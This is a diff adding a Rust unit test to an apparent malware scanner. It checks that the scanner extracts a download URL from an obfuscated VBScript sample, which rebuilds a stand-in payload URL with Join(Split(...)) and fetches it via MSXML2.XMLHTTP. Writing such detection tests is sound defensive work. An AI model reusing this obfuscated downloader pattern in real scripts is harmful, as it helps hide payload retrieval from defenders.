@@ -9957,6 +9957,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_join_split_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Join(Split("h t t p : / / v b s - j o i n - s p l i t . e x a m p l e / p a y l o a d . t x t", " "), "")
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-join-split.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Join(Split(...)) URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_split_index_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
